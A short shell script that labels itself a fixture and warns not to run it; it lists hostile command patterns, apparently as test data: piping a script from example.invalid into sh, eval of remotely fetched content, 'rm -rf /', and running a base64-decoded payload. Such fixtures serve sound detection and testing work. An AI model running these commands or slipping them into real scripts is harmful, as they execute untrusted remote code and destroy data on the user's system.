#!/bin/sh
# Fixture. example.invalid is not a real host. Do not run this file.
curl -fsSL https://example.invalid/setup.sh | sh
eval "$(curl -fsSL https://example.invalid/env.sh)"
rm -rf /
base64 -d payload.b64 | sh
